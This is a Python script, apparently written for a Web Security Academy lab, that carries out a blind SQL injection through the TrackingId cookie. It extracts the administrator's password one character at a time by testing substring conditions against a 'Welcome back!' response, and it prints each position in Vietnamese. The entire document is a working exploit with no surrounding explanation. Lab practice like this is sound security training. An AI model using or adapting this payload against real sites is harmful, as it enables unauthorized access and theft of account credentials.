import requests

url = "https://0a5e001803227f8480e2fd61008800c4.web-security-academy.net/"
headers = {
    "Sec-Ch-Ua": '"Chromium";v="117", "Not;A=Brand";v="8"',
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": '"Windows"',
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-User": "?1",
    "Sec-Fetch-Dest": "document",
    "Referer": "https://0a5e001803227f8480e2fd61008800c4.web-security-academy.net/",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9"
}

cookies = {
    "session": "kX4XHLgIHMXE1P22kcegnRa7zYAkGstV",
}
characters = 'abcdefghijklmnopqrstuvwxyz0123456789'
for position in range(1, 21):  
    for char in characters:
        payload = f"G5Qms5keW95m5pPq'+and+(select+substring(password,{position},1)+from+users+where+username%3d'administrator')%3d'{char}'--"
        cookies['TrackingId'] = payload
        response = requests.get(url, headers=headers, cookies=cookies)
        if "Welcome back!" in response.text:
            print(f"Vị trí {position}: {char}")
            break
